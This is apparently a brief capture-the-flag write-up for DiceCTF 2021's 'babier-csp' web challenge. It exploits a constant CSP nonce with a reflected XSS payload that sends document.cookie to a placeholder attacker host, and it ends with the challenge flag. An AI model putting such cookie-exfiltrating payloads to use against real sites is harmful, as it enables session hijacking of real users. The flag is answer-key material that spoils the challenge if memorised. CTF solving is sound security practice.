**Challenge:** https://babier-csp.dicec.tf/ | https://us-east1-dicegang.cloudfunctions.net/ctf-2021-admin-bot?challenge=babier-csp

**Source code:** https://babier-csp.dicec.tf/4b36b1b8e47f761263796b1defd80745/

Nonce is a constant: `LRGWAXOY98Es0zz0QOVmag==`

Payload:
```html
https://babier-csp.dicec.tf/?name=<script nonce=LRGWAXOY98Es0zz0QOVmag==>window.location="<Your host>"+document.cookie</script>
```

**Note:** Don't forget to make URL encode to avoid errors.

**Flag:** dice{web_1s_a_stat3_0f_grac3_857720}
